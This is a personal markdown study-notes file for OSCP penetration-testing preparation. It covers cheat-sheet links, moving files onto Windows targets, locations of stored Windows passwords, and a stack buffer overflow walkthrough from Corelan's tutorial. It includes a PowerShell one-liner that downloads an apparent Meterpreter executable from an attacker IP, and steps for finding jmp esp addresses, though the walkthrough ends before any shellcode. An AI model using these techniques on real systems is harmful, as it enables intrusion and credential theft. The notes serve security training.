# TJ Null Path to Try Harder
TJNull presented at BSidesDC 2019.  I've been using his blog as a good reference point to start for things to review BEFORE signing up for PWK.  Some content I decided to put in their own `md` files.  Links can be found here: https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html
# Active Recon

## Service Enum - Pen Testing Cheat Sheet

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
Local File Inclusion (LFI): https://highon.coffee/blog/lfi-cheat-sheet/
Linux Commands: https://highon.coffee/blog/linux-commands-cheat-sheet/ 
`systemd`/`systemctl` cheat sheet: https://highon.coffee/blog/systemd-cheat-sheet/
Reverse Shell Cheat Sheet: https://highon.coffee/blog/reverse-shell-cheat-sheet/

## Transferring Files to Your Account - Linux --> Windows
https://blog.ropnop.com/transferring-files-from-kali-to-windows/
- When on Windows (no `curl` or `wget`) use PS `WebClient` object: `(new-object System.Net.WebClient).DownloadFile('http://IP_ADDR/met888.exe','C:\Users\AdminUser\
Desktop\met888.exe')`

## Transferring Files to Your Account - Tools -
- `bitsadmin` - Windows command line tool to create download/upload jobs and monitor progress

## Privileger Escalation
### Windows Guides - Fundamentals
http://www.fuzzysecurity.com/tutorials/16.html
Location to check for config files w/stored passwords:
Typically these are the directories that contain the configuration files (however it is a good idea to check the entire OS):
- c:\sysprep.inf
- c:\sysprep\sysprep.xml
- %WINDIR%\Panther\Unattend\Unattended.xml
- %WINDIR%\Panther\Unattended.xml

In addition to Groups.xml (stored in SYSVOL) several other policy preference files can have the optional "cPassword" attribute set:
Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes

### Windows Priv Esc Guide
Commands to run to check for XAMPP, Apache, or PHP and check for config files:
`dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf`

## Buffer Overflows
### Corelan
### (Part I)[https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/]
- Most functions start with: `PUSH EBP` followed by `MOV EBP,ESP`

Source Code:
```
#include  

void do_something(char *Buffer)
{
     char MyVar[128];
     strcpy(MyVar,Buffer);
}

int main (int argc, char **argv)
{
     do_something(argv[1]);
}
```

Register
```
00401290  /$ 55             PUSH EBP
00401291  |. 89E5           MOV EBP,ESP
00401293  |. 81EC 98000000  SUB ESP,98
00401299  |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]             ; |
0040129C  |. 894424 04      MOV DWORD PTR SS:[ESP+4],EAX             ; |
004012A0  |. 8D85 78FFFFFF  LEA EAX,DWORD PTR SS:[EBP-88]            ; |
004012A6  |. 890424         MOV DWORD PTR SS:[ESP],EAX               ; |
004012A9  |. E8 72050000    CALL                 ; \strcpy
004012AE  |. C9             LEAVE
004012AF  \. C3             RETN
```
- `SUB ESP,98` - decreemnt ESP by a certain number of bytes (most likely > 128 bytes) - gives space for the MyVar variable
- `MOV` and `LEA` instructions basically setup parameters for `strcpy` function taking pointer where `argv[1]` sits and copying data from `MyVar` into it
- `strcpy()` does not `PUSH` instructions to put data on stack, it reads a byte and writes it to the stack, using an index (i.e. `ESP`, `ESP+1`, `ESP+2`)
    - So `ESP` still points to the beginning of the string
- Means if data in Buffer is > `0x98`, it will overwrite saved `EBP` and eventually `EIP`
- `ESP` still points to beginning of string, `strcpy()` completes as if nothing is wrong, then function kicks in.  Moving `ESP` back to where saved `EIP` was stored and issue a `RET`

- _Stack Based Overflow_/_Stack Buffer Overflow_ - When a buffer on the stack overflows
- _Stack Overflow_ - trying to write past the end of the stack frame

> A quick note before proceeding : On intel x86, the addresses are stored little-endian (so backwards).  The AAAA you are seeing is in fact AAAA :-)  (or, if you have sent ABCD in your buffer, EIP would point at 44434241 (DCBA)

- `msf` has a tool `/pattern_create.rb` to generate a string that creates unique patterns, and `pattern_offset.rb` (`/usr/share/metasploit-framework/tools/exploit/`)
- Scenario
	- Buffer - All `A`s
	- EBP - is 4 Bytes, and all `A`s as well
	- EIP - is set to `B`s
	- ESPs - All `C`s - to start
		- modify and add "shellcode" - aka pattern to identify where to point/what to run
		- analyze and determine there is a delay (aka ESP starts at 5th), which warrants `preshellcode`
		- then the goal is to build the real shellcode, & tell EIP to jump to the address of the start of the shellcode
			- overwrite EIP with `0x000ff730` aka address of `d esp` in the screenshots
			- *turns out you cannot just overwrite EIP with a direct memory adress* . Not a good idea because it isn't reliable and also contains a null byte (`0x00`)
			- So goal changes to make the application jump to own provided code
				- Reference a register (or offset to a register), such as ESP, and find function that will jump to that register
		- `ffe4` = opcode for `jmp esp`
		- Searching for opcodes
			- Tool DLL specific (walkthrough example): `s 0b1000 1 01fdd000 ff e4`
			- Windows DLLs: `s 70000000 l fffffff ff e4`
			- `findjmp`
			- [`metasploit` opcode DB](https://web.archive.org/web/20080704110517/http://www.metasploit.org/users/opcode/msfopcode.cgi)
			- `memdump`
			- `pvefindaddr`
		- `jmp esp` address from list must not have null bytes (since shellcode needs to go in `ESP`, and null bytes act as a string terminator - in most cases)

Continue at: `Get shellcode and finalize the exploit`

# Web App Attacks
## [Burp Suite Webinar](https://www.youtube.com/watch?v=h2duGBZLEek&t=28s)
- Github for Enumeration lists: `danielmiessler/Seclists`